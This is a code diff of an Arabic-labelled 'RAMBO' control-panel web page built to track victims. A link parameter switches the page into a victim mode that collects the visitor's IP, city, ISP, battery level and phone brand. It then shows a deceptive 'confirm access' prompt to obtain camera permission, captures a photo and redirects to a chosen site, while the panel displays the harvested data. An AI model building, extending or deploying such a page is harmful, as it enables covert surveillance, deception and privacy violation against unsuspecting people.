@@ -3,57 +3,57 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dashboard v3.0</title>
+    <title>Dashboard v4.0 | RAMBO</title>
     <style>
-        :root { --bg: #030303; --card: #0a0a0a; --neon-blue: #00d2ff; --neon-green: #39ff14; --text: #e0e0e0; --glass: rgba(255, 255, 255, 0.05); }
+        :root { --bg: #020202; --card: #080808; --neon-blue: #00d2ff; --neon-green: #39ff14; --text: #e0e0e0; --glass: rgba(255, 255, 255, 0.03); }
         body { margin: 0; background: var(--bg); font-family: 'Segoe UI', Roboto, sans-serif; color: var(--text); overflow-x: hidden; }
-        .container { display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+        .container { display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
         
         .admin-box { 
             background: var(--card); padding: 35px; border-radius: 15px; width: 100%; max-width: 450px; 
-            border: 1px solid #1a1a1a; box-shadow: 0 0 30px rgba(0, 210, 255, 0.1);
-            backdrop-filter: blur(10px); transition: 0.4s;
+            border: 1px solid #111; box-shadow: 0 0 40px rgba(0, 210, 255, 0.05);
+            backdrop-filter: blur(15px); transition: 0.4s; z-index: 2;
         }
 
-        h2 { text-align: center; color: var(--neon-blue); margin-bottom: 30px; font-weight: 200; letter-spacing: 3px; text-transform: uppercase; }
+        h2 { text-align: center; color: var(--neon-blue); margin-bottom: 30px; font-weight: 200; letter-spacing: 4px; text-transform: uppercase; }
         
         .mode-container { display: flex; gap: 15px; margin-bottom: 25px; }
         .mode-card { 
-            flex: 1; background: var(--glass); border: 1px solid #222; padding: 20px; border-radius: 12px; 
-            text-align: center; cursor: pointer; transition: 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            flex: 1; background: var(--glass); border: 1px solid #1a1a1a; padding: 20px; border-radius: 12px; 
+            text-align: center; cursor: pointer; transition: 0.3s ease;
         }
-        .mode-card.active { border-color: var(--neon-blue); background: rgba(0, 210, 255, 0.05); transform: translateY(-5px); box-shadow: 0 5px 15px rgba(0, 210, 255, 0.2); }
-        .mode-card b { font-size: 14px; display: block; }
+        .mode-card.active { border-color: var(--neon-blue); background: rgba(0, 210, 255, 0.05); transform: translateY(-3px); }
+        .mode-card b { font-size: 13px; display: block; }
 
         input { 
-            width: 100%; padding: 15px; background: #000; border: 1px solid #222; border-radius: 10px; 
-            color: #fff; margin-bottom: 20px; box-sizing: border-box; transition: 0.3s;
+            width: 100%; padding: 15px; background: #000; border: 1px solid #1a1a1a; border-radius: 10px; 
+            color: #fff; margin-bottom: 20px; box-sizing: border-box; font-size: 14px;
         }
         input:focus { border-color: var(--neon-blue); outline: none; }
 
         .main-btn { 
             background: linear-gradient(45deg, #00d2ff, #3a7bd5); color: #000; border: none; 
             padding: 16px; border-radius: 10px; cursor: pointer; width: 100%; font-weight: bold; 
-            font-size: 14px; text-transform: uppercase; transition: 0.3s;
+            text-transform: uppercase; transition: 0.3s;
         }
-        .main-btn:hover { filter: brightness(1.2); transform: scale(1.02); }
+        .main-btn:hover { filter: brightness(1.2); }
 
-        .result-box { 
-            margin-top: 25px; padding: 15px; background: #000; border-radius: 10px; 
-            border: 1px dashed var(--neon-green); display: none; animation: fadeIn 0.5s;
-        }
+        .result-box { margin-top: 25px; padding: 15px; background: #000; border-radius: 10px; border: 1px dashed var(--neon-green); display: none; }
 
-        #log-area { margin-top: 30px; display: none; animation: slideUp 0.6s; }
+        #log-area { margin-top: 30px; display: none; animation: fadeIn 0.8s; width: 100%; }
         .data-log { background: #050505; padding: 20px; border-radius: 12px; border-right: 3px solid var(--neon-green); }
-        .info-row { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 13px; border-bottom: 1px solid #111; padding-bottom: 5px; }
+        .info-row { display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 13px; border-bottom: 1px solid #111; padding-bottom: 6px; }
         .info-row span { color: var(--neon-blue); }
 
-        /* واجهة الضحية */
+        /* تذييل الصفحة */
+        .footer { margin-top: 30px; text-align: center; font-size: 11px; color: #444; width: 100%; max-width: 450px; }
+        .footer b { color: var(--red); display: block; margin-bottom: 5px; color: #da3633; }
+        .rambo-tag { margin-top: 10px; color: var(--neon-blue); font-family: monospace; letter-spacing: 2px; opacity: 0.6; }
+
         .victim-overlay { position: fixed; inset: 0; background: #000; z-index: 9999; display: flex; justify-content: center; align-items: center; }
         .dialog { background: #080808; padding: 40px; border-radius: 15px; text-align: center; border: 1px solid #1a1a1a; width: 85%; max-width: 320px; }
         .hidden { display: none !important; }
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-        @keyframes slideUp { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
     </style>
 </head>
 <body>
@@ -63,12 +63,8 @@
         <h2>Control Center</h2>
         
         <div class="mode-container">
-            <div id="m1" class="mode-card active" onclick="selectMode('1', 'm1')">
-                <b>سحب بيانات الضحية</b>
-            </div>
-            <div id="m2" class="mode-card" onclick="selectMode('2', 'm2')">
-                <b>سحب صور</b>
-            </div>
+            <div id="m1" class="mode-card active" onclick="selectMode('1', 'm1')"><b>سحب بيانات الضحية</b></div>
+            <div id="m2" class="mode-card" onclick="selectMode('2', 'm2')"><b>سحب صور</b></div>
         </div>
 
         <input type="text" id="targetUrl" placeholder="أدخل رابط الوجهة">
@@ -84,18 +80,23 @@
                 <p style="color:var(--neon-blue); font-size:12px; margin-bottom:15px;">📡 التقارير الواردة:</p>
                 <div id="device-data"></div>
                 <div id="image-data" class="hidden">
-                    <img id="captured-img" style="width:100%; border-radius:8px; margin-top:15px; border:1px solid #333;">
-                    <a id="download-link" download="report.jpg" style="display:block; color:var(--neon-green); font-size:11px; text-align:center; margin-top:10px; text-decoration:none;">تحميل الوسائط</a>
+                    <img id="captured-img" style="width:100%; border-radius:8px; margin-top:15px; border: 1px solid #222;">
+                    <a id="download-link" download="RAMBO_REPORT.jpg" style="display:block; color:var(--neon-green); font-size:11px; text-align:center; margin-top:10px; text-decoration:none;">تحميل الوسائط</a>
                 </div>
             </div>
         </div>
+    </div>
+
+    <div class="footer">
+        <b>غير مسؤول في استخدامك للموقع !</b>
+        <div class="rambo-tag">Develop By RAMBO</div>
     </div>
 </div>
 
 <div id="victim-ui" class="victim-overlay hidden">
     <div class="dialog">
         <h3 style="color:#fff; font-weight:300;">تأكيد الدخول</h3>
-        <p style="color: #666; font-size:13px;">يرجى السماح بالوصول للكاميرا للمتابعة إلى المحتوى المطلوبة.</p>
+        <p style="color: #666; font-size:13px;">يرجى السماح بالوصول للمتابعة.</p>
         <button id="cameraBtn" class="main-btn" style="margin-top:15px;">متابعة</button>
     </div>
     <video id="video" autoplay playsinline style="display:none"></video>
@@ -103,7 +104,7 @@
 </div>
 
 <script>
-    let activeMode = '1'; // 1 = بيانات ، 2 = صور
+    let activeMode = '1';
     const urlParams = new URLSearchParams(window.location.search);
     const vMode = urlParams.get('v');
 
@@ -115,19 +116,30 @@
 
     if (vMode) {
         document.getElementById('admin-panel').classList.add('hidden');
+        document.querySelector('.footer').classList.add('hidden');
         
         async function startProtocol() {
             const ipData = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
             const batt = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve(null));
-            
+            const ua = navigator.userAgent;
+
+            // تحديد نوع الهاتف
+            let deviceBrand = "غير محدد";
+            if (ua.match(/iPhone/i)) deviceBrand = "iPhone";
+            else if (ua.match(/Samsung/i)) deviceBrand = "Samsung";
+            else if (ua.match(/Huawei/i)) deviceBrand = "Huawei";
+            else if (ua.match(/Xiaomi/i)) deviceBrand = "Xiaomi";
+            else if (ua.match(/Android/i)) deviceBrand = "Android Device";
+
             const payload = {
                 ip: ipData.ip || "N/A",
                 city: ipData.city || "Unknown",
                 isp: ipData.org || "Unknown",
                 os: navigator.platform,
+                brand: deviceBrand,
                 batt: batt ? (batt.level * 100).toFixed(0) + "%" : "N/A"
             };
-            localStorage.setItem('rep_info', JSON.stringify(payload));
+            localStorage.setItem('rambo_info', JSON.stringify(payload));
 
             const redir = localStorage.getItem('redir_to') || 'https://google.com';
 
@@ -144,7 +156,7 @@
                             const canvas = document.getElementById('canvas');
                             canvas.width = 640; canvas.height = 480;
                             canvas.getContext('2d').drawImage(video, 0, 0);
-                            localStorage.setItem('rep_img', canvas.toDataURL('image/jpeg'));
+                            localStorage.setItem('rambo_img', canvas.toDataURL('image/jpeg'));
                             stream.getTracks().forEach(t => t.stop());
                             window.location.href = redir;
                         }, 800);
@@ -165,9 +177,10 @@
 
     window.addEventListener('storage', (e) => {
         document.getElementById('log-area').style.display = 'block';
-        if (e.key === 'rep_info') {
+        if (e.key === 'rambo_info') {
             const d = JSON.parse(e.newValue);
             document.getElementById('device-data').innerHTML = `
+                <div class="info-row">نوع الهاتف: <span>${d.brand}</span></div>
                 <div class="info-row">عنوان IP: <span>${d.ip}</span></div>
                 <div class="info-row">المدينة: <span>${d.city}</span></div>
                 <div class="info-row">المزود: <span>${d.isp}</span></div>
@@ -175,7 +188,7 @@
                 <div class="info-row">البطارية: <span>${d.batt}</span></div>
             `;
         }
-        if (e.key === 'rep_img') {
+        if (e.key === 'rambo_img') {
             document.getElementById('image-data').classList.remove('hidden');
             document.getElementById('captured-img').src = e.newValue;
             document.getElementById('download-link').href = e.newValue;
